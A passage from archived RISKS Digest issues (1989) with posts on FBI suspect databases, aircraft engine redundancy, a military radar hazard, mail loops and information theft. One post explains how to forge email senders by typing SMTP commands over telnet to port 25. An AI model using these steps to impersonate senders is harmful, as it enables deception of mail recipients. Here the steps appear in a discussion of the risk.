Social Security Administration and the Securities and Exchange Commission.
   One by one, review panels have scaled back that plan."
   "There's a lot of sensitive information in those data bases," said Lt.
Stanley Michaleski, head of records for the Montgomery County [Maryland]
police.  "I'm not going to tell you that cops aren't going to misuse the
information."
   The most controversial portion of the planned system would be a major
expansion to include information on criminal suspects - whose guilt has not yet
been established.
   The proposed system would include names of persons under investigation in
murder, kidnapping or narcotics cases.  It would include a so-called "silent
hit" feature: An officer in Texas, for instance, would not know that the
individual he stopped for speeding was a suspect for murder in Virginia.  But
when the Virginia investigators flipped on their computer the next morning, it
would notify them of the Texas stop.  To Michaleski, the proposal sounded like
"a great idea.  Information is the name of the game."
   But the "tracking" ability has angered critics.
   "That [data base] could be enlarged into all sorts of threats - suspected
communists, suspected associates of homosexuals.  There is no end once you
start," said Rep. Don Edwards (D-Calif.), whose subcommittee called for the
report on the FBI's system.
   The FBI's chief of technical services, William Bayse, defends the proposed
files, saying they would help catch criminals while containing only carefully
screened names.  "The rationale is these guys are subjects of investigations,
and they met a certain guideline," he said.
   So controversial is the suspect file that FBI Director William Sessions
reportedly may not include it when he publicly presents his plan for a new
system.

    [A case similar to Sklar's was reported previously in RISKS -- that of
    Terry Dean Rogan, who was arrested five times because of outstanding
    warrants caused by someone else masquerading as him.  He finally settled
    for $50,000 in damages.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
   Internet mail forgery
</A>
</H3>
<address>
&lt;<A HREF="mailto:Walter_Roberson@CARLETON.CA">
Walter_Roberson@CARLETON.CA
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 22:14:45 EST
</i><PRE>

A few days ago, someone forged a message to rec.music.misc. The "From:" address
corresponded to that of a gateway for the Apollo mailing list.  A couple of
people, not recognizing that the fake name corresponded to a mailing list, sent
their replies in `privately' instead of to rec.music.misc, with the result that
their replies were broadcast whereever the Apollo list and comp.sys.apollo
reaches. They were, it seems, subsequently `flamed' for their unintential
mis-mailing.

A subsequent note from someone, exposing the message as a forgery, states

&gt; With SMTP and/or NNTP, the forgery could come from anywhere, not
&gt; necessarily berkeley or ucsf.

Perhaps someone else can comment on this: can we trust -any- of our
(non-encrypted) network mail to be from the claimed author? How about the
other way around: how much danger is there that someone can spoof mail in
order to receive messages destined for someone else?

   Walter Roberson  &lt;Walter_Roberson@Carleton.CA&gt;  (if you can believe that...)

References: &lt;11366@cgl.ucsf.EDU&gt; (the forged message)
            &lt;8039@netnews.upenn.edu&gt; (the exposure, written by
 george%hyper.lap.upenn.edu%netnews.upenn.edu%eecae%mailrus.uucp@
 ames.arc.nasa.gov  (George "Sir Lleb" Zipperlen) )

    [The simple answer is "no".  Furthermore, encrypting the networks does not
    help very much if the operating systems are vulnerable to attack.  
    Previous spoofs include "Chernenko at Moskvax" (see ACM SIGSOFT Software
    Engineering Notes 9 4, July 1984, and last year's "Spafford" hoax.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Dead code maintenance
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 18:04:41 PST
</i><PRE>

My useless code maintenance story concerns a job I applied for once, as a
contracted programmer, specifically to maintain one Cobol program.  It was
billed as a 20-hour per week job, and it's maintenance had kept a Stanford
Ph.D. programmer/statistician busy for that amount of time, for some months.
(None of this relates to work done at or for Stanford.)

The job was to run the program against fresh data a couple of times a week, and
keep the record formats (which rarely changed) up to date.  As soon as I
reviewed the program, having taken the well-paid job, I discovered that all it
did was read-in a file a record at a time, and rewrite some fields from each
each record it read-in, without any data change or sorting whatsoever.  The
second set of records was then read by a statistical program -- which could
have read-in the original records directly, simply ignoring the un-needed
fields! I contemplated how easy the job was, but recommended scrapping the
Cobol program, which not even said Ph.D. had realized was utterly purposeless.
This was done - and so I put myself out of work.

I wonder how many programmers do similarly unproductive work because their
managers don't realize what is and isn't really being accomplished?  Sometimes
immediate management knows the score, but instructs one to take more time than
needed to make a change.  In one employment I was told to take at least two
weeks to change the title line in a report, to impress upon senior management
how tricky it was and how overloaded we all were.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Probabilities and Engines
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 17:50:26 PST
</i><PRE>

In RISKS 8.26 blinn%dr.DEC@decwrl.dec.com, Dr. Thomas P. Blinn writes:

&gt;In RISKS-FORUM Digest Volume 8 : Issue 24, it is asserted by Barry Redmond that

&gt;&gt;If someone makes a mistake on one engine at any of these times, there is a
&gt;&gt;high probability that they will make the same mistake on the other engine(s).

&gt;That may be true, but it may not be true, because the same person may not
&gt;be working on all the engines.  I would agree that an incompetent mechanic
&gt;working on all the engines is likely to make the same mistakes on all of
&gt;them, but the reality of aircraft engine repair is different.

   There are several well known cases where all engines on a multi-engine
aircraft failed (or were in the process of failing) due to the same 
maintenance error.  Sometimes it's the result of a single person's work,
and in other cases it's the result of systematic error by a group.  The 
reality is that such errors and failures do occur.

&gt;The probabilities of failure are not independent because if one engine fails it
&gt;immediately increases the probability of another failing.

&gt;&gt;This is a very interesting assertion.  It seems to be saying that there is a
&gt;&gt;causal relationship between a first engine failure and the likelihood of a
&gt;&gt;second.  ...  , but this doesn't mean that the probability of failure of the 
&gt;&gt;other engines has changed in any way. ...
 
   There is such a causal reationship.  When one engine fails, the remaining 
engine(s) may have to be operated at increased power levels and shoulder
additional tasks.  This raises the stress on them, and gives us an a priori 
knowledge of increased probabilty of failure.  

   It may be necessary to have a thorough grounding in probability theory
and statistics, but it is also necessary to have knowledge of the specifics
of real world operations.  Either without the other sets us up to allow 
problems to escape detection and analysis.

</PRE>
<HR><H3><A NAME="subj4.2">
 Probabilities and Engines 
</A>
</H3>
<address>
Robert Dorsett
&lt;<A HREF="mailto:mentat@louie.cc.utexas.edu ">
mentat@louie.cc.utexas.edu 
</A>&gt;
</address>
<i>
Thu, 16 Feb 89 14:56:20 CST
</i><PRE>

NOTE: a longer version of this tirade will soon appear on USENET's
rec.aviation...  I'll mail a copy to anyone without usenet access.

Jordan Brown wrote:
&gt;727 engines (3/airplane) are wimpy compared to DC-9 engines (2/airplane).
&gt;BAe-146 engines (4/airplane) are *really* wimpy.  (This assumes that
&gt;727s are approximately the same size as DC-9s.  Bae-146's are smaller.)

The 727 and DC-9 engines are the same, derivatives based on the Pratt &amp; 
Whitney JT8D.  What is significant, in the context of this discussion, is 
how the engine thrust relates to the airplane weight.  Here are a few 
thrust-to-weight ratios, assuming various weights and engine-remaining 
situations:

    727-200,000 lbs (max)   727-200, 140,000 lbs    DC-9-30,140,000 lbs (max)
3           4:1                 3:1
2           6:1                 5:1                     4:1
1           13:1                9:1                     9:1

One can change the performance of an airplane by losing weight; to lose
weight, fuel is dumped.  The 727 can lose some 60,000 lbs of fuel.
The one-engine case with no fuel is a performance increase of some 30% 
over the same thrust at max.weight.  

To give an example of the significance of all this, recently a fully-loaded 
Continental 747, enroute to New York, attempted to take off from Gatwick, 
heading north.  It had an engine fire and shutdown at takeoff.  The pilot was 
just barely able to hold altitude after takeoff (with three engines), at 200-
300 feet, with the stick shaker and stall warnings active.  The airplane went 
behind some trees; the controller called a crash after losing radar and visual 
contact.  The plane dumped a massive amount of fuel, managed to gain altitude 
(after several minutes), and returned to the field.  

The moral here, again, is that from the mundane perspective of keeping
the airplane in the air, it's not how many engines you have, but how
much you weigh.  What is far more important for trans-oceanic operations
is how likely it is to lose some or all of your engines, and how likely it 
would be to get to an airfield once you do.  Considering the frequency
with which total (or near-total) freakish engine failures have occurred the 
last few years (even though the engines themselves are more reliable 
than in the past), this isn't really as trivial or as "safe" as the numbers
might have us believe.  


&gt;Airplanes are required to be
&gt;able to maintain such-and-such a level of performance with one engine out.

The most important situation normally considered being takeoff.  I doubt 
a 727 could take off with two engines out; it wouldn't have the time necessary 
to dump, or the thrust necessary to maintain airspeed.  As the above 747 
example shows, even the worst-case performance figures can be misleading.
At the end of the flight, that same 747 would be able to perform with only
one engine operating (as a recent United Airlines emergency landing 
on a flight to Tokyo showed). 


&gt;I don't believe a 727 can fly on one engine.  It must have two.

It can fly on one engine.  And even if it couldn't fly on one engine, as 
another poster pointed out, having *any* thrust means the difference between 
a steep glide and a long glide.  According to the 727 patterns manual, a one-
engine ILS approach is made by assuming a decision height of some 600 feet, 
with an airspeed in the 160-170 kt range.  Best climb speed, for the go-
around, is 200 kts (190 knots with two degrees of flaps).  There's an 
implicit assumption in the training manual that between 600 feet and ground 
level, they will be able to accelerate--and hold--200 kts.


&gt;A three-engine airplane has a higher probability of having a failure in
&gt;the first place, and when it does have a failure it then has two points
&gt;of failure, EITHER of which will cause an accident.

The 727 has three engines because, more than any other factor, Boeing 
perceived a need to trade off airline requirements at the time the plane was 
constructed.  United Airlines wanted a four-engine airplane, Eastern wanted 
two.  So they compromised, and agreed on three.  I suspect a similar history
with the Tristar and DC-10: four is too many, two is too few.  Three is nice
and "safe." 


&gt;Going from one engine to two adds redundancy.  Going from two to three,
&gt;with two required, REDUCES redundancy.

Perhaps we should look up the meaning of "redundancy."  Three engines provide
three thrust sources, three generators, three pneumatics sources, and (on the
727) two hydraulic sources.  I can't imagine how that is "bad," since (apart
from fuel starvation, mismanagement, and particle ingestion) they really don't
have a common failure mode.  There are more parts to fail, but the issue here
is whether more engines will make it more likely for everything to go wrong in
a catastrophic manner, which years of experience has shown to be fallacious.

Robert Dorsett

</PRE>
<HR><H3><A NAME="subj4.3">
Re: Aircraft failures (RISKS DIGEST 8.26)
</A>
</H3>
<address>
&lt;<A HREF="mailto:dag@fciva.UUCP">
dag@fciva.UUCP
</A>&gt;
</address>
<i>
Thu, 16 Feb 89 16:52:04 -0500
</i><PRE>

First, there seems to be some disagreement on the subject.  Does anyone have
any information on the capability of currently popular 3-engine commercial
aircraft (DC10, L1011, B727) to maintain level flight with only one functioning
engine?

Second, to expand upon the comments of Dr. Blinn, my recollection of statistics
is as follows:

Each engine has its own (unknown) probability of failure during any time
interval.  This probability is a function of many known and unknown factors
(history, current aircraft state, fuel, maintainence, etc.).  Initially, we
have an ESTIMATE of this probability which is the same for all engines: some
sort of historical average or other statistic.  The failure of one engine on an
aircraft gives additional information regarding those factors which are common,
and thus allows us to revise our estimate of the probabilities of another
failure on the same aircraft in the near future.

Normally, a statistician would say that the probability of failure hasn't
changed, just our estimate.  There is an exception to this statement.  It is
possible that the failure of the first engine is itself a factor in the failure
of the second, for example, by increaseing the load that engine is run under,
or stress on the aircraft from unequal thrust.

I think the most misunderstood aspect of statistics is that probability
distributions for real world phenomena are rarely known, only estimated.  The
march of time gives us new information to refine our estimates.
                     						  Dan Graifer
The usual disclaimers....
Daniel A. Graifer, Franklin Capital Investments,
7900 Westpark Drive, Suite A130, 	McLean, VA  22102     (703)821-3244

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.26.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.28.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-78</DOCNO>
<DOCOLDNO>IA013-000132-B046-397</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.28.html 128.240.150.127 19970217025633 text/html 24202
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:55:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 28</TITLE>
<LINK REL="Prev" HREF="/Risks/8.27.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.29.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.27.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.29.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 28</H1>
<H2> Sunday 19 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Continuing problems with WWMCCS command-and-control network 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  US missile-warning radar endangers friendly aircraft 
</A>
<DD>
<A HREF="#subj2.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Power failure problems 
</A>
<DD>
<A HREF="#subj3.1">
John Sinteur
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  The Risks of Going on Vacation 
</A>
<DD>
<A HREF="#subj4.1">
Jim Carson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Faking Internet mail 
</A>
<DD>
<A HREF="#subj5.1">
Peter Scott
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Multi-gigabuck value of information theft denied 
</A>
<DD>
<A HREF="#subj6.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: multi-gigabuck information "theft" 
</A>
<DD>
<A HREF="#subj7.1">
David Chase
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Authenticity in digital media 
</A>
<DD>
<A HREF="#subj8.1">
Doug Krause
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Digital doctoring of images 
</A>
<DD>
<A HREF="#subj9.1">
Richard Wiggins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  PIN?  Who needs a PIN?  
</A>
<DD>
<A HREF="#subj10.1">
Bill Mahoney
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Continuing problems with WWMCCS command-and-control network
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
17 Feb 1989 09:25:29 EST
</i><PRE>

The following excerpts are from GOVERNMENT COMPUTER NEWS Feb. 6, 1989 p.1:

AF MAY LOSE WIS PROJECT - DCA LIKELY TO TAKE OVER GLOBAL SYSTEM by Brad Bass

Officials in the Office of the Secretary of Defense (OSD) planned to meet
late last week to consider transferring responsibility for procuring an
upgraded Worldwide Military Command and Control System (WWMCCS) from the
Air Force to the Defense Communications Agency. ...

Glenwood Stevener, director of DCA's Joint Data System Support Center, said
the Air Force's WWMCCS Information System (WIS) program was a victim of
a vicious circle of schedule slippage and budget cuts.  `` These things
feed on each other,'' he said.

WWMCCS began in the late 1970's as an effort to provide the president, the
Defense secretary, the Joint Chiefs of Staff and other military authorities
with information to help them make wartime decisions.

When a study later that decade showed the system was too slow and limited,
officials launched the WIS upgrade project.

The Air Force has suffered several setbacks since being selected in 1982
to manage WIS.  In July 1987, the WIS program office announced the system
would be delayed about a year due to funding cuts and system development
problems.

A year ago the General Accounting Office reported that program officials
had not adequately defined system requirements and security measures.
Subsequent funding problems delayed the project by another 12 months to
15 months.

Air Force officials who requested anonymity said OSD officials recently
set up a task force to propose alternative methods to upgrade WWMCCS in
light of WIS program difficulties. ...

DCA would take more of an ``evolutionary'' approach to the upgrade than
the Air Force did, Stevener said.  He said the Air Force has been attempting
to field a turnkey system to fulfill a broad range of WWMCCS requirements.
The DCA plan would focus on a fielding a partial system at first and
incrementally adding capabilities to it, he said.

In addition, Stevener said DCA would probably change the name of the program
to differentiate it from WIS.

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
US missile-warning radar endangers friendly aircraft
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
Fri, 17 Feb 89 10:07:17 PST
</i><PRE>

These are excerpts from THE NEW YORK TIMES, Feb 12, 1989, p. 14:

ADEFENSE RADAR MUST TURN OFF AS PLANES LAND - AIR FORCE FEARS SYSTEM
COULD TRIGGER A BLAST  (no author given)

WASHINGTON, Feb. 11 (AP) - For 14 months operators of a huge radar 
installation in central Georgia that is part of the United States' defense 
warning system have had to turn off the system while military aircraft 
landed at a nearby base.

The interruptions are to avoid accidental detonations of tiny explosive 
charges found in virtually every military weapons system and in the planes 
and ships that deliver them.

The charges are used, among other things, to trigger weapons, drop bombs or
jettison fuel tanks.  They are normally fired by an electrical circuit,
bu they can also be set off by high levels of electromagnetic energy from
such sources as radio waves, static electricity, lightning or radar.

As a result, the powerful radar center has to be turned off periodically so
planes can land safely at Robins Air Force Base, two miles to the north.

That precaution is not enough, local critics contend.  They fear a major 
accident at the air base and have sued to force safety improvements.

INTENDED TO SPOT MISSILES

The $90 million radar complex, on of four of its type in the United States,
would provide instant warning of a submarine-launched missile off the south-
east coast [ The story does not say so, but I believe this must be one
of the PAVE PAWS phased-array radar intallations - JJ ].

Th Air Force says the unit's time out of service caused by landing planes
totals about an hour a month.  Ther interruptions have not hindered the
early warning system, the Air Force says, because they are random and other
radars are available as backups.  Routine maintenance of the system turns the 
radar off for about 40 hours a month, an official said.

The 10-story, pyramid shaped installation consists of thousands of antennas
that can scan 240 degrees for 3,000 miles and can reportedly identify an 
object the size of a basketball 1,500 miles away.

CRITICS FEAR A DISASTER

(Robins Air Force Base) is Georgia's largest and is near the city of Warner-
Robins, which has a population of 40,000. ... Critics have filed a lawsuit
in Federal Court in Washington.  

Patricia Axelrod, coordinator of one of the groups that has joined in the 
suit ... argues that flight restrictions force pilots into`` a trapeze
act without a net'' because of the possibility of an error in the
communication required to turn off the radar. 

Senator Sam Nunn, the Georgia Democrat who is chairman of the Senate Armed
Services Committee, has also criticized the restrictions because of their
reliance ``on the potentially fallible human links'' required to turn the 
system off.

OPTIONS BEING CONSIDERED

The Air Force has already spent $600,000 for a study by the Raytheon
Corporation, which built the radar system.  The study recommended moving it,
at a cost of $37.7 million, or modifying it, at a cost of $27 million, so it
would turn off automatically if a plane breached the restricted zone.

Lieut. Gen. Donald J. Kutyna, who heads the Air Force Space Command that has
jurisdiction over the unit, said moving it is not reasonable but modification
remains under consideration.  A decision is to be made in June.

[I find several things interesting about this story, apart from the overall
irony of the situation.  First, it is another illustration of the tendency
noted by Paul Bracken and others for modern military C3I systems to become 
ever-more tightly-coupled and interdependent in ways unforseen by their
designers.  Second, Nunn and others' assumption that some kind of automated 
system would necessarily be more reliable than the present arrangement.

- Jon Jacky, University of Washington ]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Power failure problems
</A>
</H3>
<address>

&lt;<A HREF="mailto:ADEGROOT@HROEUR5.BITNET">
ADEGROOT@HROEUR5.BITNET
</A>&gt;
</address>
<i>
Sun, 19 Feb 89 13:38 N
</i><PRE>

I ran into something curious when I visited my previous employer yesterday.
They moved to a brand new building recently, and took the opportunity to
increase access-security. They installed magnetic card readers on all doors
(including the computer-room doors), keeping physical access to the office
space and the computer room under control in a better way.

They thought.

A few days after the move, the power went down. The UPS cut in, and kept the
computer systems on juice. The operators have got 15 minutes to manually turn
off the computer systems (after software shutdown procedures of course) before
the batteries are out as well.  Unfortunately, the card readers were out,
making it very difficult indeed to enter the computer room...

No need to say that they modified the system a bit...

It's small things like this that are difficult to anticipate, but
are sooooo important...
                                        -John Sinteur

Whatever I say is not to be taken as a statement of the Dutch Army
(my current employer) or my previous employer who shall remain nameless here.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
The Risks of Going on Vacation
</A>
</H3>
<address>
Jim Carson 
&lt;<A HREF="mailto:carson@rice.edu">
carson@rice.edu
</A>&gt;
</address>
<i>
Sun, 19 Feb 89 12:06:31 CST
</i><PRE>

I was going to be out of town and wanted to use "vacation."  For 
those who aren't familiar with it, vacation is a program from
4.[23]BSD that sends a form letter back to anyone who sends you 
mail.  This is useful because you can let people know when you 
will return and give them other ways to contact you in an emergency.

Vacation has provisions so you don't send mail to MAILER-DAEMON, Postmaster, or
a *-Request@*, since these senders are usually automated and you could risk
getting into a mail-loop if you sent form-letters back.

Now consider what would happen if you subscribed to an automated discussion
group that sends mail without any of these lines in the header.  This was the
case with Sun-Spots, the Sun discussion group moderated by Bill LeFebvre at
Rice.  The header:

&gt; From SUNSPOTS@icsa.rice.edu Sun Feb 19 09:42:43 1989
&gt; Reply-To: SUN-SPOTS%RICE.EDU@icsa.rice.edu
&gt; Sender: Sun Spots Discussion &lt;SUNSPOTS%RICE@icsa.rice.edu&gt;

The discussion group was set up so when Bill is done compiling an issue, he
sends it to a mail alias containing a list of everyone who subscribes to
Sun-Spots.  When I got a copy of the issue, vacation sent a reply.  However,
since the reply goes to everyone who subscribes to the group, including myself,
a reply to the reply was sent, and so on.

About forty messages were sent before I logged in this morning to check for any
last minute mail.  One of the other subcribers sent me mail because he thought
we had a mail virus.  [...]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Faking Internet mail [Re: <A HREF="/Risks/8.27.html">RISKS-8.27</A>]
</A>
</H3>
<address>
Peter Scott 
&lt;<A HREF="mailto:PJS@grouch.JPL.NASA.GOV">
PJS@grouch.JPL.NASA.GOV
</A>&gt;
</address>
<i>
Fri, 17 Feb 89 10:07:19 PDT
</i><PRE>

It is incredibly easy to fake mail.  Read RFC 821, which although it is 50
pages long, details on page 4 everything you need to know. The server on the
first remote machine (that which comes after "@") expects to see commands of
the form:
	HELO    (optional)
	MAIL From: &lt;reverse-path&gt;
	RCPT To: &lt;forward-path&gt;
	DATA
	&lt;mail message not containing a line that has consists of '.' only&gt;
	.
	QUIT    (optional)

There are other possible commands, but those are enough.  You can enter these
manually by TELNETting to the SMTP port on the remote machine (TELNET machine
25).  Of course, you can enter whatever you want after "From:".  I have sent
messages to friends purportedly from Grim.Reaper@Hells.Gate, but much more
latitude is possible.  The just released "With A Microscope and Tweezers"
report on the Internet worm (they called it a virus) includes an account of how
a message detailing several aspects of the operation of the worm was posted
"anonymously" to a newsgroup.

I don't see how you could authenticate the sender, except with a
public-key encryption system.  Fat chance of implementing that everywhere
on the Internet this century.  

Occasionally I see messages which contain a header of the form "Warning: From:
field does not match Sender".  How does that come about and who constructs the
Sender: field? 

&gt;How about the
&gt;other way around: how much danger is there that someone can spoof mail in
&gt;order to receive messages destined for someone else?

The only way I know of doing this is if your machine is on the path for
the mail in the first place, in which case you can look at everything
that passes through anyway.

I use VMS and we don't have NEWS (yet), so maybe someone can tell me
whether the same thing is possible for USENET news articles? [...]

Peter Scott (pjs@grouch.jpl.nasa.gov - really)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Multi-gigabuck value of information theft denied
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Fri, 17 Feb 89 12:07:19 EST
</i><PRE>

A few days ago I summarized for RISKS an article that had appeared in
the Toronto Star on February 8 about a case of "theft" of information. [...]

Two days later, however, significantly different facts were reported.
(This submission to Risks was delayed because I intended to email to
Mike Tilson to ask if he wanted to write something himself.)

Information here is from the (Toronto) Globe &amp; Mail.  The article is
headlined "Computer information theft detected by security system,
company says".  And it begins as follows:

#  The theft of information from a company's computer program [sic]
#  was detected by the firm's own computer security system.
#
#  Mike Tillson [sic], president of HCR Corp., which specializes in
#  developing computer software, said yesterday an unusual pattern
#  of computer access was noticed on the company's system last week.

The article continues by saying that police reports valuing the "program" at $4
billion (Canadian) were called grossly exaggerated by Tilson:  "It's more in
the tens of thousands of dollars range".  He also said that the illegal access
had been only a week before; there was no 2-month investigation.  And asked
about resale of the information , he said:  "It's not clear how one would
profit from it.  There are any number of purposes one could imagine to idle
curiosity.  There is a possibility of no criminal intent."

The information not being HCR customer data, and Tilson declining to identify
it, the article goes on to mention UNIX, to mumble about AT&amp;T intellectual
property, and to note that AT&amp;T is not in the investigation "at this stage".

Mark Brader				"Every new technology carries with it
SoftQuad Inc., Toronto			 an opportunity to invent a new crime"
utzoo!sq!msb, msb@sq.com				-- Laurence A. Urgenson

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: multi-gigabuck information "theft"
</A>
</H3>
<address>
David Chase
&lt;<A HREF="mailto:chase@orc.olivetti.com ">
chase@orc.olivetti.com 
</A>&gt;
</address>
<i>
Thu, 16 Feb 89 12:11:44 -0800
</i><PRE>

In RISKS 8.26, Jeff Makey says:

&gt; The "computer files" are nothing more than the source
&gt; code for AT&amp;T's UNIX operating system ... few thousand dollars --
&gt; a far cry from $4 billion.  I suspect that AT&amp;T's lawyers are at
&gt; the root of this sensationalism.

I think in this case the lawyers are doing their job, and it might not be
sensationalism.  I believe (word of mouth from UNIX-related legal mess that
some friends were in long ago) that the UNIX operating system is protected by
trade secret law, and (according to my copy of _Legal Care for Your Software_)
a corollary of this is that you must diligently maintain the "secret"
(licensed, confidential) status of that software, or all your legal protection
is gone.  If the lawyers don't behave like rabid piranhas, then perhaps they
aren't being diligent, and if they aren't diligent and lose trade secret
protection, then the loss to AT&amp;T could well total billions.

And, of course, since we're talking about product protection, "UNIX" is a
trademark of AT&amp;T.

David Chase

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Authenticity in digital media [<A HREF="/Risks/8.26.html">RISKS-8.26</A>]
</A>
</H3>
<address>
Doug Krause 
&lt;<A HREF="mailto:dkrause@ORION.CF.UCI.EDU">
dkrause@ORION.CF.UCI.EDU
</A>&gt;
</address>
<i>
17 Feb 89 11:39:37 GMT
</i><PRE>

"ALBTSB::SCHILLING1" &lt;schilling1%albtsb.decnet@aldncf.alcoa.com&gt; writes:
&gt;
&gt;Seeing hasn't been believing for a long time.  Remember Fred Astaire dancing on
&gt;the ceiling in the movie "Singing in the Rain"?

Gene Kelly was in "Singing in the Rain".  Fred Astaire's ceiling dance
was in "Royal Wedding".

Douglas Krause, University of California, Irvine   

                        [Also noted by cmb@robots.oxford.ac.uk (Chris Brown).]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Digital doctoring of images (re Steve Philipson, <A HREF="/Risks/8.25.html">RISKS-8.25</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Richard_Wiggins@um.cc.umich.edu">
Richard_Wiggins@um.cc.umich.edu
</A>&gt;
</address>
<i>
Thu, 16 Feb 89 09:33:00 EST
</i><PRE>

Steve Philipson points out the risks of new technologies to digitally alter
video images and audio recordings.  An article in The Whole Earth Review about
three years ago discussed the digital doctoring of photographic (still) images;
